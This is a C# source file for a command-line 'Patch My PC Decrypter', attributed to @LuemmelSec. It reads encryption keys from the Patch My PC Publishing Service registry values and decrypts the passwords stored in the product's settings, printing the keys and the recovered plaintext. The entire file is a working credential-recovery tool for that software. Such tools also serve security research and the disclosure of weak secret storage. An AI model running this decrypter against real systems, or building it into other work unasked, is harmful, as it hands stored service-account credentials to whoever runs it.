// Decrypter passwords from Patch My PC settings files
// by @theLuemmel / LuemmelSec

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        string text = @"
             .********,                                                          
        ,**,,,************                                                      
      **,,******************                                                    
    .*,,****.         *******,                                                  
    *,,***,            .*************** Patch My PC ***********************,     
   .*,****              **************** Decrypter **************************    
   .******              ****///////// by @LuemmelSec //////////////////////.    
    *******,           ***////                   ****////      .***////.           
     .*********,..,*****/////                    ****////      .***////.           
       ,************///////                      ****////      .***////.           
          .///////////(,                         ****////       ***////            
                                                   **//,         ,*///            
        ";
        Console.WriteLine(text);
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: PMP-Decrypter.exe <encryptedText> [privateKey] [saltKey] [ivKey]");
            return;
        }

        string encryptedText = args[0];
        string privateKey = null;
        string saltKey = null;
        string ivKey = null;

        // Check if privateKey, saltKey, and ivKey were provided as arguments
        if (args.Length >= 4)
        {
            privateKey = args[1];
            saltKey = args[2];
            ivKey = args[3];
        }
        else
        {
            // Try to fetch privateKey, saltKey, and ivKey from the registry
            privateKey = GetRegistryValue("SOFTWARE\\Patch My PC Publishing Service", "Data1");
            saltKey = GetRegistryValue("SOFTWARE\\Patch My PC Publishing Service", "Data2");
            ivKey = GetRegistryValue("SOFTWARE\\Patch My PC Publishing Service", "Data3");
        }

        if (string.IsNullOrEmpty(encryptedText))
        {
            Console.WriteLine("Error: Encrypted text is empty.");
            return;
        }

        if (string.IsNullOrEmpty(privateKey) || string.IsNullOrEmpty(saltKey) || string.IsNullOrEmpty(ivKey))
        {
            Console.WriteLine("Keys not found in the registry. Please provide them manually as arguments.");
            return;
        }
        else
        {
            Console.WriteLine("Keys found in the registry:");
            Console.WriteLine("privateKey: " + privateKey);
            Console.WriteLine("saltKey: " + saltKey);
            Console.WriteLine("ivKey: " + ivKey);
        }

        string decryptedText = Decrypt(encryptedText, privateKey, saltKey, ivKey);

        if (!string.IsNullOrEmpty(decryptedText))
        {
            Console.WriteLine("Decrypted Text: " + decryptedText);
        }
    }

    public static string Decrypt(string encryptedText, string privateKey, string saltKey, string ivKey)
    {
        try
        {
            if (!string.IsNullOrEmpty(encryptedText))
            {
                byte[] array = Convert.FromBase64String(encryptedText);
                byte[] bytes = new Rfc2898DeriveBytes(privateKey, Encoding.ASCII.GetBytes(saltKey)).GetBytes(32);
                ICryptoTransform transform = new AesCryptoServiceProvider
                {
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.None
                }.CreateDecryptor(bytes, Encoding.ASCII.GetBytes(ivKey));
                using (MemoryStream memoryStream = new MemoryStream(array))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        byte[] array2 = new byte[checked(array.Length + 1)];
                        int count = cryptoStream.Read(array2, 0, array2.Length);
                        memoryStream.Close();
                        cryptoStream.Close();
                        string text = Encoding.UTF8.GetString(array2, 0, count).TrimEnd(new char[1]);
                        return Encoding.UTF8.GetString(array2, 0, count).TrimEnd(new char[1]);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Decryption error: " + ex.Message);
        }
        return string.Empty;
    }

    public static string GetRegistryValue(string subKey, string valueName)
    {
        try
        {
            using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(subKey))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(valueName);
                    if (value != null)
                    {
                        return value.ToString();
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Registry error: " + ex.Message);
        }
        return null;
    }
}
